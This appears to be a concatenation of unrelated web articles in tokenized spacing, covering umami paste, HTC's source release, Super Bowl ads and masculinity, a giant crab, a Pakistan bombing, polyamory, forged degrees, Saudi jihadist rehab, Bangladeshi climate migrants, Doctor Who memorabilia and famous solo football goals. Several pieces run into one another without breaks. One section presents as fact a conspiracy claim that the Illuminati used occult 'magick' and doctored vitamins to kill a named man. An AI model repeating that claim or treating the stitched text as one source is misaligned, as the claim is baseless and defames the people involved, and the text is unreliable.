You ’ve probably heard of umami , the elusive “ fifth taste ” following in the heels of sweet , salty , sour , and bitter .
But unless you ’re a world - renowned restaurant chef , you ’d probably be at a loss to describe the flavor sensation , and may not even know if you ’ve tasted it before .
But now , home cooks will finally be able to come up with their very own umami- flavored creations , thanks to the new “ Taste No 5 ” purée developed by a chef named Laura Santtini .
The paste , which includes a mix of ingredients like anchovies and porcini mushrooms , will be available in tubes in more than 200 Waitrose and Booths grocery stores throughout England .
“ Umami is part of our everyday eating lives , ” Santtini told The Telegraph , “ it is just that many of us do n’t know what to call it .
It is what gives depth of flavor to food .
Every food culture has its umami-rich ingredients , whether it is seaweed in Japan or Parmesan in Italy . ”
There ’s no word yet on when the umami paste will be available in the United States , but if you ’re outside of England and want to create recipes incorporating the so - called fifth taste , here are some ingredients to incorporate ( though probably not all in the same dish , unless you ’ve got a very tough stomach ) :
1. Tomato
2. Sauerkraut
3 . Soy sauce
4. Miso paste
5. Parmesan cheese
6. Vegemite ( an Australian yeast extract spread – definitely an acquired taste ! )

HTC has just announced the release of the DROID Eris source code .
Most people will most likely not even take notice since there ’s nothing much they can do with it , but developers should be grateful .
Over the past year , the Android platform has fragmented quite significantly .
HTC has played its part with the fragmentation by releasing most of their new handsets with their Sense UI customization .
With the release of the source code , HTC gives developers an inside look at how the handset ’s OS is built , giving the developers the opportunity to tweak their apps for optimal performance on the HTC handset .
HTC is also aware that there is a huge developer community dedicated to their handsets .
The DROID Eris kernel source code will allow developers to customize , tweak , and build their own ROMs for the DROID Eris .
To our knowledge , HTC is the only manufacturer that has given developers the source code to their handsets .

“ Why not change the world ? ” is not just a tagline ; it is our way of life .
Did you watch the Super Bowl this year ?
If you did n't , you should have : the comeback victory by Drew Brees and the Saints - - and the hope and joy it restored for a time to a city forever associated with tragedy - - will live on in American sports lore .
And even if you 're not a fan of the NFL , the telecast on that given Sunday was exceptional in one sense : the game was far better than the ads .
Normally , many viewers tune in to the Super Bowl not only to see the game ; they also want to see the best that Madison Avenue has to offer during the commercial breaks .
But if the offerings we saw this year were any indication , there are some serious problems in the industry .
We were treated to a series of misogynistic ads that ranged from the unbelievably offensive to the mildly irritating .
And that does n't even mention the fact that Focus on the Family , of all groups , got to air an anti-choice ad during the pre-game show .
But there 's a deeper problem afoot .
If it were just one or two offending ads , it would be easy to dismiss them as the product of an insular , all - male marketing department ( iPad , anyone ? ) .
But with so many spots all harping on the same theme , it would be intellectually lazy to sit back , slam everything and fail to examine what it could mean that so many advertisers think that they can sell their wares by such an overt appeal to emasculation .
The truth is , many men are feeling dis-empowered .
Now that you 're done laughing , let 's examine this concept in greater detail .
We 've come a long way since 1999 .
After a full decade of nearly unmitigated prosperity , movies like American Beauty , The Matrix and Fight Club touched on a feeling of middle - class malaise : was there life beyond khakis , Ikea furniture , and a respectable job ?
Those films and many like them had as their subject shedding the stifling constraints of stable conformity in the search of meaning and the true self .
Films like these likely had a more significant appeal to men , who felt they were the primary victims of cubicle culture , the " political correctness " movement , and the now - famous Ikea lifestyle .
Unfortunately , we 've gone in entirely the wrong direction .
Little more than 10 years later , it seems that we would give anything to have that opportunity back .
The renegade aspirations of the last millennium had an underlying assumption : that stability was always achievable for men who did not have the testicular fortitude to pursue their iconoclastic fantasies .
The Great Recession has impacted everyone , but it 's important to note that it has not been an equal opportunity unemployer .
The recession was caused primarily by meltdowns in two sectors : housing and finance .
These industries are , of course , dominated primarily by men .
As a result , nearly three - quarters of all jobs lost since 2008 were formerly held by men .
That , of course , is a massive loss of economic power .
And despite the fact that conservative fundamentalists still think that gay marriage is the world 's biggest threat to marriage , economic stability is likely a leading factor as well .
As the seminal article from The Atlantic linked above indicates , job losses by men have resulted in many other social ills , including increased divorce rates and , more troubling , higher domestic violence rates .
These are problematic enough , but a more alarming challenge to the strength of our social fabric lies in the conflict between economic reality and gender self - identification :
In Identity Economics , the economists George Akerloff and Rachel Kranton find that among married couples , men who are n’t working at all , despite their free time , do only 37 percent of the housework , on average .
And some men , apparently in an effort to guard their masculinity , actually do less housework after becoming unemployed .
It would be very simple to claim that some men out there are simply being controlling and can't adjust to the idea of not being breadwinners and dealing instead with the seemingly more menial tasks associated with household and family maintenance .
Arlie Hochschild 's crucial book The Second Shift explored this double - standard more fully : the current economy requires women to work , and yet household responsibilities are still often seen as the primary responsibility of the woman in heterosexual relationships .
But our economy is transitioning : as the Atlantic article points out , it is entirely possible that in the next few months , more jobs in America will be held by women than by men .
And while the feminist movement has sought to equate the importance and stature of domestic work with salaried work , men are not the only one who see themselves as rightful breadwinners :
Edin ’s research in low - income communities shows , for instance , that most working women whose partner stayed home to watch the kids — while very happy with the quality of child care their children ’s father provided — were dissatisfied with their relationship overall .
“ These relationships were often filled with conflict , ” Edin told me .
Even today , she says , men ’s identities are far more defined by their work than women’s , and both men and women become extremely uncomfortable when men ’s work goes away .
Economic reality is changing faster than gender self - identification can keep up , and men are not the only ones responsible .
So what does this have to do with those misogynist Super Bowl ads ?
A lot .
The feminist movement has long recognized that unequal economic power is one of the primary factors that enable other forms of gender discrimination , especially in terms of household decision - making .
Economic power is still certainly not equal between genders -- there is still a very large pay gap , and it was only last year that President Obama signed the Lily Ledbetter Fair Pay Act .
But despite the work that remains to be done , we are still much more equal than we ever have been in the past .
This increased economic power gives women increased independence -- and therefore , increased leverage to be influential in financial and household decisions , from a structural point of view .
Unless you 're a member of the Taliban or a fundamentalist conservative ( the American Taliban ) , it goes without saying that this is an unqualified good .
But with greater power comes greater responsibility .
Let 's imagine that two hypothetical commercials had aired during this year 's Super Bowl .
These commercials feature women who are weary of pleasing their husbands by attending their events , or helping with their side projects , or sitting around with them watching sports because he does n't want to do anything else .
And as a reward for her perseverance , she purchases some product that appeals to her in order to reclaim some happiness in her existence .
Would these hypothetical ads have generated much outrage , despite a strong hint of misandry ?
Probably not , because the paradigm of long - suffering women working their way through their husbands ' inadequacies is culturally acceptable .
Two of the more maligned misogynist Super Bowl ads -- the Dodge Charger ad and the FloTV ad -- had very similar themes , except with the genders reversed .
And while the thought of reclaiming one 's identity through any purchased product -- especially a two - inch TV - - is ludicrous , any advertising that seems to insult an entire gender should be considered unacceptable .
The feminist movement has sought -- with all moral justification and authority -- to reshape the self - identity of women from powerless to powerful , no matter whether that is manifested culturally , economically , artistically , sexually , or athletically .
But that has required a new self - identity for men too : our previous identity -- the one of the rightful breadwinner , the decision - maker , and the one who " wears the pants " -- has rightfully needed to be stripped away to ensure an equal place for women at the table of life .
But this has created another issue .
While feminism has worked consistently to build up a new positive self - identity for women , there does not seem to be a concomitant positive self - identity replacement for the other half of the population -- and without that positivity , in these tough economic times the most available replacement is the misogynist , dominant and often violent self - identity we are all hoping to eliminate .
As the paradigms of gender roles and equality continue to shift , consistent expectations of what men should be would serve as a well - oiled transmission .
Crabzilla has feeding arms more than five ft long
A Japanese spider crab believed to be the biggest ever seen in Britain is set to go on show at Birmingham 's National Sea Life Centre .
Dubbed Crabzilla , his front feeding limbs are more than 5 ft ( 1.5 m ) long and end in big claws .
The Sea Life Centre will be his home until the end of March when he will be taken to his permanent home in Belgium .
The crabs are commonly found in the Pacific in 1,000 ft ( 300 m ) deep waters but have been known to live deeper .
Curator Graham Burrows said : " It is rumoured these crabs can grow as big as four metres , big enough to straddle a car .
" He will absolutely dwarf the other crabs in there , but he 's not aggressive and they should have nothing to worry about . "
The crustacean has been flown to the UK en route to a permanent home in Belgium from Japan and has been quarantined in Dorset .

The fragile Pakistani government of Prime Minister Yusuf Raza Gilani and President Asaf Ali Zardari was deeply embarrassed Wednesday when a massive bombing killed 3 US soldiers on the ground in that country .
The Pakistani public has been increasingly upset about US military and para-military ( Blackwater / Xe ) actions in their country .
On Tuesday , several US drone strikes killed a total of 29 persons .
The controversy over whether the US is actually fighting a third war , in Pakistan , may have been settled by the troop deaths .
On Wednesday morning , A suicide car bomber slammed into a Frontier Corps convoy of vehicles heading to inaugurate a girls school in the village of Kad , in the Lower Dir district of northwest Pakistan , killing 7 and wounding at least 130 .
Among the dead were 3 US troops in Pakistani dress and a Frontier Corpsman .
The others were schoolgirls .
The attack occurred as the convoy was reaching two girls ’ schools , one an elementary school and one a high school rebuilt with US funds .
The force of the blast collapsed the high school ’s walls , but it was empty .
Most of the wounded were schoolgirls in the elementary school , hit by flying glass and debris ; ironically , given that the Taliban claim to be Muslims , some were having their class on Islam when the shrapnel hit them .
The bombing was claimed by the Tehrik - i Taliban Pakistan ( Taliban Movement of Pakistan ) , according to Agence France Presse : “ We claim responsibility for the blast , ” Tehreek - e - Taliban Pakistan ( TTP ) spokesman Azam Tariq said in the call from an undisclosed location .
“ The Americans killed were members of the Blackwater group .
We know they are responsible for bomb blasts in Peshawar and other Pakistani cities . ” ‘
Many Pakistanis believe that the wave of bombings besetting their country , blamed by the mainstream on the Taliban , is secretly carried out by American agents , in order to destabilize Pakistan and justify a US imperial presence .
The bombing differs little from numerous other such attacks in the frontier badlands , but is distinctive because it accidentally revealed that some 200 US troops are on the ground in Pakistan , some 60 - 100 on a training mission .
Those killed had been giving training and support to the Frontier Corps , a Pakistani unit charged with policing the lawless Pashtun areas on the border between Pakistan and Afghanistan .
The News says , “ The US soldiers were apparently in the area to train the FC [ Frontier Corps ] personnel engaged in the military operation against the Taliban in Maidan , which is the native area of Tanzim Nifaz Shariat - e- Muhammadi ’s [ Organization for the Implementation of the Law of Muhammad ’s ] jailed chief Maulana Sufi Muhammad .
The Taliban group in the area was commanded by Hafizullah , who had escaped the action . ”
The Daily Times notes that ‘ Local authorities appear confused by the foreign troops ’ plans to attend the inauguration of the school , as “ they had little role in the project ” . ‘
But in fact , The Guardian reveals that ‘ The attack also highlighted an even less well - known civilian aid scheme : a retired US official said the defence department had been discreetly funding development projects such as schools in North West Frontier for years .
The targeted soldiers could have been going to the school in Dir as “ a show of solidarity ” with their Pakistani colleagues , he said . ‘
The targeting of the convoy by truck bomb strongly suggests that the operation was an assassination aimed at the US troops , and further suggests that the Taliban had a man on the inside among the Frontier Corps , who could report the Americans ’ movements .
The US military is known to use jamming technology that interferes with the detonation of roadside bombs by remote control , so that ramming by car bomb would be the only way an insurgent group could bomb them .
Aljazeera English has video :
Opinion polls show that many observers in Pakistan already feel that the US is humiliating their country and sowing discord there , and this revelation of the presence of US troops on the ground , along with the Department of Defense role in building girls ’ schools , will further raise hackles ( and risks making girls ’ schools unpopular even among non-Taliban ) .
The USG Open Source Center translated an editorial by Dr Hussein Ahmed Paracha : “ How Much Dignity is Left ? ” , published in Nawa-e Waqt in Urdu on January 18 , 2010 , which exemplified this point of view :
‘ The United States has been attacking within Pakistani land with drones for the last four to five years and is also killing innocent people .
. .
There were 44 drone attacks in 2009 alone in which more than 700 innocent people , majority of whom were innocent children , elderly , and women , were killed .
According to the statistics provided by various agencies , those who belonged to “ Al - Qa’ida ” or the Taliban could not be more than 18 . . .
Having made sure that the wealth of our national dignity has turned to ashes and the last flame has burned down , the US Administration has now announced a program of naked screening for the passengers coming from a few countries .
All these countries are Muslim countries , and Pakistan is one of them .
Yes , the same Pakistan , which is the frontline US ally in war against terror .
Pakistan has danced to death in others ’ parties and has made fun of itself .
It is the same Pakistan , which left its citizens starving and spent $ 35 billion in others ’ war .
. .
The United States is bent on treating us shamelessly .
Moreover , we pay too much regard to anyone coming from the United States .
The Blackwater operatives , who committed heinous and inhuman crimes in Iraq , come wherever they please in Pakistan without visa or travel document .
They keep on roaming around in vehicles with fake number plates with dangerous weapons .
These US officials point guns at the security people if asked to reveal their identity .
During a few minutes debate , there is a series of phone calls from the high officials , and they , who consider Pakistan as their playground , are allowed to go with honor . ’
In an opinion poll done last summer , 64 % of the Pakistani public said that they saw the US as an ‘ enemy , ’ and only 9 % saw it as an ally .
Pakistan was born out of the Freedom Struggle against British colonial domination , which aimed at securing independence for what had been branded as ‘ British India ’ and an end to control of the place by foreign Western white Christian troops .
The return of such troops to Pakistani soil under an American guise will be highly unwelcome to most Pakistanis .
Now that Pakistan is having parliamentary elections again , moreover , it matters what the public thinks , because they could well vote for anti-American parties in the next polls , as part of a backlash against US intervention .

Starshine Bucking Monogamy Free-Loving Dissidents Buck Puritanism and Practice Polyamory
Thoroughly perforated by Puritanism , we Americans are quite sure that if something feels really , really good , it ’s probably very , very bad for you .
Like shooting smack , watching porn on your boss ’s computer , or digging to the bottom of an order of Outback ’s Aussie Cheese Fries .
Love affairs are another example .
In order to reap the toe - curling rewards of conventional romance — from the shivery intensity of new sex to the unparalleled peace of enduring intimacy — we must also abide the inevitable tedium of monogamy .
We must accept and embrace the thrill - sapping sameness that yangs true love ’s yin .
Or must we ?
A covey of free - thinking , free - loving dissidents is bucking Puritanism , bucking monogamy , and , frankly , bucking anyone else who ’s game .
They practice what they call “ polyamory , ” or being openly — and therefore ethically — involved in multiple intimate relationships .
“ Poly , ” as it ’s called for short , encompasses all sorts of consciousness - expanding configurations : from stick - straight to gay - as - the - day - is - long , from married couples with separate - but - not - secret lovers to a trio of adoring roommates who share more than the water bill .
It ’s not polygamy and it ’s not “ swinging . ”
It ’s consensual non-monogamy with as much emphasis on love as on sex .
“ People tend to harp on the sexual component , but the relationship component is just as important , ” said Thomas Amoroso in the Boston Globe ’s recent story about the phenomenon .
Amoroso is a Massachusetts ER doctor and poly practitioner who shares a female life partner with another man .
Today ’s polyamorists are n’t the first to reject the traditional one - on - one courtship and marriage model ; surely , intriguing romantic arrangements have been made behind closed doors for centuries .
But spurred , perhaps , by recent nationwide debate about the definition of marriage , and united into regional groups via the Internet ( there is n’t currently an active group in Santa Barbara ) , their numbers appear to be growing .
Coined in the 1990s by a self - described “ neo- pagan poet , ” the word “ polyamory ” is in both the Merriam - Webster and Oxford English dictionaries .
Experts estimate more than half a million people in the U.S. engage in openly polyamorous relationships .
For old - skool copulators like myself , the concept can be unsettling .
I think about polyamory and my “ naughty ” alarms go off , especially when I hear about the poly guy who told Portland Monthly Magazine that his missus serves him and his girlfriends post - coital snacks .
“ There ’s nothing sexier than having your wife bring you food when you ’re in bed with another woman , ” he said with no apparent shame .
How can this be right ?
Why is he allowed to have intimacy , trust , and variety , damn him ?
But when I shake off any socially conditioned priggishness , it ’s hard to find real fault .
It ’s not heartless if you ’re connecting with someone emotionally ; it ’s not dishonest if everyone consents .
Logically , then , the only fair question is whether you can truly be in love with more than one person at a time :
Does adding a second lover necessarily subtract from your bond with the first ?
I ’ve heard that hurt feelings can still occur between poly playmates ; just because there ’s no betrayal does n’t mean there ’s no jealousy .
I know a married mom from Santa Barbara who ’s polyamorous — but her beloved husband is n’t .
And he ’s not crazy about her two long - term lovers .
“ I do n’t necessarily believe in the limits that we place on relationships in a traditional marriage , ” she said .
“ I believe that the more people you love , the better your life will be .
I believe in flexibility in thinking . ”
Indeed , it takes an open mind to properly ponder poly ’s ethical and emotional geometry .
Assume , for starters , that its devotees look just like the rest of us prudes .
They ’re not witchy weirdos with lust in their eyes ; they ’re artists and engineers , realtors and baristas .
And the much - loved mom above ?
No kidding : She ’s a wedding planner .

A university registrar who offered forged degrees to two women in return for spanking sessions has been given a suspended jail sentence .
Bristol Crown Court heard that Karl Woodgett filmed himself caning the women at a Bristol hotel .
The 37 - year - old , of Ewell Minnis , Kent , worked at the University of Bath at the time of the offences .
He was given a nine - month sentence suspended for a year after admitting conspiracy to make fake degrees .
' Pain management '
Woodgett was also ordered to undertake 200 hours of community service .
The court heard that Woodgett , who originally lived in Frome , Somerset , had at first paid Cameroonians Elsie Neh and Mbone Kemba to be spanked under the pretence that he was conducting a " pain management " study .
He later offered fake university qualifications in return .
The scam was uncovered by a UK Border Agency investigation .
Woodgett also pleaded guilty to two counts of possession of articles for use in fraud .
His ex-wife , Delphine Kah , 31 , pleaded guilty to conspiracy to make fake degrees .
The court heard Kah , of London , and Woodgett both forged bachelor and masters degrees for Kah and members of her family when he worked as a university registrar for the University of Surrey .
Kah , who is also Cameroonian , was sentenced to four months in prison , suspended for 12 months , and 200 hours of community service .
A cushy Saudi Arabian “ rehab ” center where terrorists are encouraged to express themselves through crayon drawings , water sports and video games is under scrutiny after one of its graduates re-emerged as a leader in the al Qaeda branch claiming responsibility for trying to blow up an airliner on Christmas .
Said Ali al Shihri — a former Guantanamo
Bay detainee who now heads the terror group al Qaeda in the Arabian Peninsula — obviously did n’t get to the bottom of his America - hating issues while undergoing the controversial rehab for jihadists .
Inmates like Shihri are supposed to while away the days playing ping - pong , PlayStation and soccer in hopes that the peaceful environment will help them cope with their jihadist rages .
Bomb - makers and gunmen participate in art therapy to help them explore their feelings non-violently .
In between tasty picnic - style meals of rice and lamb and snacks of Snickers along with dips in the pool , participants practice Arabic calligraphy , produce dizzying Jackson Pollack rip -offs and imagine the aftermath of car bombings in crayon .
Some 1,500 al Qaeda terrorists have “ graduated ” from the program , including 108 former Guantanamo Bay detainees , the Washington Post reported .
“ The Saudis talk about a success rate of 80 to 90 percent , but when you look at what those numbers mean in reality , it all falls down .
There is no criteria for evaluation , ” John Horgan , a Department of Homeland Security consultant , told the New York Post .
In 2009 , Horgan visited several of the Saudi terrorism rehab centers to report on the programs for Homeland Security .
“ These guys are not being de-radicalized .
They are being encouraged to disassociate from terrorism , but that does n’t mean their fundamental views changed , ” said Horgan , director of the International Center for the Study of Terrorism at Penn State .
The Saudis launched the programs after the kingdom was rocked by a series of al Qaeda - inspired attacks in 2003 and 2004 .
But despite the Saudi government ’s best efforts , which also include setting up graduates with jobs , introductions to potential wives and new cars , many of the terrorists do n’t seem to be getting the peace message .
“ Several ‘ returnees ’ from Guantanamo Bay continue to espouse a virulent hatred of the United States and Western society in general , ” Horgan wrote in a September report .
That includes Shihri , who has been busy ignoring the peaceful precepts he was taught in terror rehab and has resumed his hardcore jihadist ways .
Shihri is a top member of the al Qaeda branch in Yemen which claims to have masterminded the failed plot to blow up Flight 253 to Detroit on Christmas Day .
He also is suspected of coordinating the 2008 bombing of the US embassy in Yemen , ABC reported .
Another former Gitmo detainee , Muhammad al Awfi , who went back to al Qaeda after his release , has ridiculed the Saudi efforts to rehabilitate jihadists as a plan to “ drive us away from Islam . ”
Shihri — who was released from Guantanamo Bay by President George W. Bush in 2007 — spent six to ten weeks at the Prince Mohammed bin Nayef Center for Care and Counseling , ABC News reported .
“ There are guards and gates and barbed wire but it ’s not quite prison , ” Christopher Boucek of the Carnegie Endowment for International Peace , who has visited the center , told ABC .
“ It ’s a communal living environment that ’s more like ‘ Hogan ’s Heroes ’ than ‘ Escape From Alcatraz . ’ ”
A team of shrinks works with the inmates in managing their emotions , and they are given lessons in Islam from imams , who warn them that jihad is only acceptable when sanctioned by the state .
Toward the end of their stint , some inmates are allowed to make unescorted visits to family members .
“ Some American officials say it ’s all about crayons and art therapy , but the things that do n’t translate are the intense emotional and intellectual strides that are made , ” Boucek told ABC .
“ They make intense bonds with the sheiks and doctors they work with .
The majority is a religious discussion giving them religious evidence to the contrary of why they think their beliefs are based on Islam . ”
Meanwhile , in the aftermath of the failed bombing of Flight 253 , some US legislators have called for the White House to stop plans to release Guantanamo detainees .
There is particular concern over Gitmo inmates with ties to Yemen , where would - be underwear bomber Umar Farouk Abdulmutallab says he connected with al Qaeda .
However , an Obama administration aide told the Washington Post that the administration wants to close the prison because it has become a “ rallying cry ” for terrorist recruiters .
Another official told the newspaper that the government has no choice to release some Gitmo detainees because of challenges in federal court .

Bangladesh : Rising tides force climate migration guardian.co.uk
" The first two or three days it was crazy .
We do n't have cars in our village , so when I saw a car I had to jump this way and that .
And my head is full of a terrible buzzing sound . "
Haran Mondols , 53 , was forced to move his extended family of 17 to Dhaka to look for work , after cyclone Aila drowned their village in southern Bangladesh in May .
Haran used to be a wealthy man with five houses for his clan - all are now gone .
Now they live in a group of huts on the perimeter of the international airport .
He clutches his head in despair as he talks about their situation : " The things we lost we could n't make again even if we tried for 50 years .
All I can think about is what we will do , what will happen to our children .
I can't eat , I can't sleep because of thinking about all of this . "
Back in the village Haran 's family were craft workers , weaving baskets .
Now they shine shoes on the streets of Dhaka , a city of 15 million people .
Because of the cost of living , even the children , who were at school before the cyclone came , have to work .
Every morning 11 - year - old Ruhi walks an hour into the centre of Dhaka .
He misses school .
" I have to work all day in the sun so I do n't feel good .
My father said I should do this work and when everything is okay back in the village I can go back and study .
I would like to go back , to school .
I want to be a teacher and have my own school . "
The family are desperate to return to their village , but like much of the area hit by Aila , it is still underwater .
Haran 's brother Kenna says the area is being abandoned .
" It 's not just us that is leaving , many people have left our village .
It 's just water there now .
Even the earth our houses stood on has been washed away . "

The Illuminati and their minions enjoy the certain knowledge that the spiritual realm not only exists and at all times interpenetrates our phenomenal world ; they also know how to manipulate elements of these spiritual dimensions to make things occur at a given place and time according to their wishes .
On the more mundane level , they know how , through the manipulation of words , sounds and symbols , to change people and the flow of events of the world in which we all move .
If Magick can be defined as " The Art and Science of causing change ( in our world ) to occur in conformity with Will " , then the Illuminati , who know with a certainty that the spiritual realm exists as a part of our " ordinary " sensory reality , have also learned how to bend , shape and manipulate that reality and the people within it to affect change which will benefit them .
They may do this through elaborate ritual , or by simply imposing their Will upon another through the strength of their thoughts .
However , it is often desirable , and sometimes even necessary , to acquire the actual physical excreta of a person they wish to control .
Therefore , strands of hair , one 's fingernail clippings or a jot of blood will provide the " physical - spiritual link " between the one they wish to influence , and the controller .
In the case of the late Philip John Jones , the Illuminati may well have sent an agent or agents to gather the physical linkage they needed .
For as surely as an insulated electrical wire will deliver its current to whatever is tethered at the other end , the direct physical link to the subject of their manipulation and attack will provide the most direct path for their influence .
Aware of his vulnerabilities , they used a " damsel in distress " to gain access to his personal space , and his personal castoffs ( hair , nails , etc. found in his bathroom ) in order to directly manipulate his health .
And more than likely , to ensure the probability of their success , a mixture of home made " vitamins " compounded by his Inamorata of the moment were added to seal his fate .
As we sleepwalk through our daily lives , most of us rarely think how the spiritual world ALWAYS interpenetrates our own .
We rarely question what may be happening in the World of Manifestation , the Spiritual world , where what is to become real begins to form and take shape before it actually appears in our Phenomenal World of physical reality .
We think of time as linear ; we think of people and events as isolated , and yet quantum theory has proven that all things , all people , all events , are interconnected .
This perpetual interconnection of all people and events in the continuum of time provide the Illuminati with the certainty that future events can be manipulated by the manipulation of signs , symbols , words , music , ritual and spells .
This is Magick .
In the spiritual realm , the realm where " good " and " evil " coexist as readily as they do in the typically mundane sphere of our five senses , those with Wisdom of such things know that nothing happens by accident , nothing happens by chance , and that there is a design and purpose to everything , whether or not our intellect can perceive it ; and that all things are interconnected , in both space and time , both from the past thru the present to the future .
And it is in that future , the pliable , plastic World of Becoming , the world of manifestation hardening into the reality of direct sensory experience , which can be changed and bent and shaped by those adroit at using the living symbols of these arcane arts to tamper with the destinies of a man , of men , and of mankind , as they see fit .
None of the Illuminati 's manipulations enjoy a foregone conclusion of success ; they only become successful because they brook no strong , knowledgeable resistance in our world to their operations on the planes of manifestation which interlock with our planes of physical reality .
It is not simply the ignorance of the Laws of the World of the Spirit -- which have nothing to do with " good " or " evil " since both reside in the spiritual realm as easily as they do in our sensory world -- which preclude us from challenging the Illuminati at their own game ; it is the fact that our feeble , rational mind , ( which bears as much relationship to full spectrum reality as our puny egos bear to the power and capacity of our total mind ) , cannot bear to admit that it does not have all the answers , or all the knowledge of all things in Heaven and Earth .
And it is from this arrogance of rational ego that The Illuminati will continue to be able to manipulate those who refuse to grasp and admit that their knowledge and use of the Laws of the Realm of the Sprit will continue to provide them with an unassailable advantage --- until we , too , fine tune our spiritual perceptions and learn to fight back and reverse the forces they have unleashed upon us to cause them the havoc they wish to inflict upon our world .
Until that time when we learn to become spiritual warriors for Truth , and learn the operational Laws of the Spiritual World ; until we admit that the Spiritual World is an eternal part of our " normal " waking reality , we will continue to be blinded to the powers and abilities The Illuminati wield against an ignorant populace , separated from their heritage of Spiritual Divinity and Power .

Makow Comment :
This article alerts us to the use of " magick " by the Illuminati .
Doctor
Who fans have spent tens of thousands of pounds at an auction of memorabilia from the show 's history .
Among the lots from the BBC Archive on offer , were Daleks and monsters , costumes worn by David Tennant , Kylie Minogue and Billie Piper and even the Torchwood SUV .
Phil Newman gave BBC
News a fan 's - eye view of the collection and caught up with one bidder lucky enough to take home two alien heads .
NB : this list does not purport to be definitive .
It is just a list of six solo goals we like .
That 's all .
Then you can tell us the ones you like .
The point of the Joy of Six is not to rank things , only to enjoy them .
During World Cups and the like , British commentators sometimes refer disparagingly to the fact the pictures come from the host broadcaster , smug in the knowledge that their channel would never miss a crucial goal because of a Tic Tac advert or miss the build - up to the third goal in an FA Cup final in 1994 .
Yet these silly foreigners occasionally get it right , and whoever directed the picture that went worldwide of Diego Maradona 's second goal against England in 1986 was bang on top of his game .
There is a lovely moment in every great solo goal when you suddenly realise that what at first appeared to be just a nice little run could actually end in a goal you 'll never forget .
With Maradona , that exact moment is accentuated brilliantly by a hard cut of which Scorsese would have been proud .
At first we see Maradona chugging down the right wing , with the ball bobbling horribly and poor old Peter Reid panting miserably in his slipstream .
All very pleasant , but there is no sense of the bigger picture or the danger to England .
Then , maybe a second after Maradona comes inside Terry Butcher , the picture snaps to a deeper shot and we realise that the only man between Maradona and Peter Shilton is Terry Fenwick .
Though Fenwick is dismally on his heels , the earliness of Maradona 's touch past him is quite sublime : it takes Fenwick out of the game before he even knows he 's in it .
One of the best things about solo and team goals , as opposed to others in the genre , is that they split into a series of little parts , so each person will have his favourite .
It might be that touch past Fenwick , the dainty pirouette to start things off , the way he has the courage to go round Peter Shilton – the product of a startling memory of a very similar incident at Wembley six years earlier – or the almost reckless determination to finish the job with his left foot , a decision which so nearly allowed Butcher to thwart him at the last .
The goal produced a perfectly judged commentary from the BBC's Barry Davies , who , in an endearing and thoroughly naïve appeal to the better nature of Joe Bloggs , said simply : " Och !
You have to say that 's magnificent . "
( Although interestingly , a few seconds later he would say that it was merely " one of the best goals we 've seen in these championships " . )
Jorge Valdano , who ran most of the way with Maradona before realising there was no point wasting energy , described it beautifully as " Diego 's personal journey " .
It was a once - in - a - lifetime goal .
So he did it again four days later .
It 's hard enough going past three or four defenders when the ball is rolling perfectly along the floor , never mind when it's in the air .
For that reason , Davie Cooper 's impromptu game of keepy - uppy against Celtic in 1979 – voted the greatest goal in Scottish football history – is quite unlike any other .
It came in the final of Drybrough Cup , a short - lived pre-season competition for the four highest scorers in the league the previous season , and has acquired almost mythical status .
The fact that the only footage of it comes from such a dodgy angle has enhanced that status ; it is football 's answer to a bootleg of Spike Island or Hendrix at Woodstock .
It was also a fitting legacy for the late Cooper , a humble genius – no hyperbole in the use of the word ' genius ' here – who wowed Ruud Gullit , and who Graeme Souness thought was more naturally gifted than even Kenny Dalglish .
Brian Clough famously noted that there was a reason why God did n't put grass in the sky .
If he 'd seen this goal , the great man – and God – might have had a different opinion .
Nobody scored solo goals quite like Roberto Baggio .
Nobody floated towards goal with the same smooth languor .
Nobody had quite the same combination of immaculate control and bigger - picture awareness .
Nobody sliced through opponents with such forensic cleanliness that defenders could not lay a foot on him , never mind the ball .
We all know about his Italia 90 saunter against Czechoslovakia .
There was also this gem against Udinese , when , with one gorgeous touch , he evoked Geoffrey Green 's wonderful description of a defender rushing " like a fire engine going to the wrong fire " .
But the best came against the champions - to - be Napoli in his final season with Fiorentina , when he moved ( you ca n't really say he ran ) 70 yards to score .
Appropriately for a man who did things in his own time , it looks even better in slow motion .
When he scored that goal , in September 1989 , Baggio was the next superstar of Italian football .
There is a certain poignancy to seeing a prodigy score a goal of such individual brilliance as to apparently justify the hype in 10 seconds flat .
Sometimes , as with Ryan Giggs at Tottenham in 1992 , it will be the prelude to so much more ; other times , as with Michael Owen in 1998 , it will be a career zenith .
With Baggio , it was both .
There is an understandable tendency to think that solo goals are based almost exclusively on skill , twisting the blood and frazzling the minds of defenders .
Yet when Lothar Matthaus scored one of the most awesome solo goals of all , against Yugoslavia during Italia 90 , he beat only one defender , and that by simply changing the direction of his run rather than through any sleight of foot .
As Sean Ingle pointed out the other day while proving that Jonathan Wilson is n't the only Rain Man in the Guardian sport team , this Sunday - night game was not live on TV in England .
The BBC showed Brazil beating Sweden 2 - 1 and cut to highlights of this game at half - time and full - time .
Yugoslavia were a fine side , who should have reached the semi-finals , but Germany trounced them 4 - 1 .
And worse still , we did n't see the mundane bits and the mortal bits .
All we saw were the goals , the first three of which all possessed a startling majesty and suggested a soul - crushing omnipotence .
They were goals that no other team could have scored .
This one , Matthaus 's second and West Germany 's third , was comfortably the pick , In fact , it 's hard to think of a goal which , at the time , was quite so terrifying .
At his absolute peak either side of Italia 90 , Matthaus bore comparison to any powerhouse midfielder in the game 's history – Cris Freddi , these islands ' best football historian , puts him in his all - time World Cup XI – and this was zenith .
It was the scene in the movie where the robotic monster eats a young baby whole and then starts cackling .
Except for England fans , this film would not have a happy ending .
Right there , right then , we all knew they were going to win the World Cup .
So did they .
One particular sub - genre of the solo goal involves the scorer beating a number of defenders in a confined space the size of a phonebox .
It 's like a game of football Jenga : after each manoeuvre you think they have to shoot before it all falls down , but they keep adding layers of skill before they finally score .
Famous examples include Zlatan Ibrahimovic , Alexandr Mostovoi and Jay - Jay Okocha , whose dance with Oliver Kahn is as much a Benny Hill sketch as a piece of football .
But we 've gone for a 35 - year - old George Best 's remarkable effort in the NASL , because Best actually predicted it a few seconds before it happened , and more importantly because we are tickled by the soccerball commentary ( " That 's the greatest soccer goal I 've ever seen .
Pow ! " ) and orgy - at - a - keep - fit - class music that accompanies it .
The backstory is interesting , too .
Anger is ostensibly more likely to motivate displays of aggression than skill , but the goal which Best describes as the greatest of his career came from a fit of pique .
His side were 2 - 0 down , and he had just been booked for arguing with the referee when he was fouled during a counter - attack .
" George said to the referee , ' I was going to score , ' " said his team - mate Chris Dangerfield .
" The ref said , ' No , you were n't , ' and George said , ' Yes , I am . ' "
